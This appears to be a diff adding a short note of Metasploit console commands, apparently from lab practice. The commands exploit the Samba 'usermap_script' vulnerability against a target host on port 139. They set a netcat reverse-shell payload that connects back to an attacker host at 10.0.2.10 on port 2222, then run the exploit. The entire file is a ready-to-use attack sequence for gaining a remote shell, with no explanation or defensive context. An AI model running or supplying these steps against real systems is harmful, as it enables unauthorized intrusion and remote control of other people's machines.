@@ -1,0 +1,12 @@
+https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script
+msfconsole
+use exploit/multi/samba/usermap_script
+set RHOST 10.0.2.12 //set the target IP
+set RPORT 139 //set the target port
+
+set PAYLOAD cmd/unix/reverse_netcat
+
+set LHOST 10.0.2.10 //set the attaker IP
+set LPORT 2222 //set the attaker port
+
+exploit
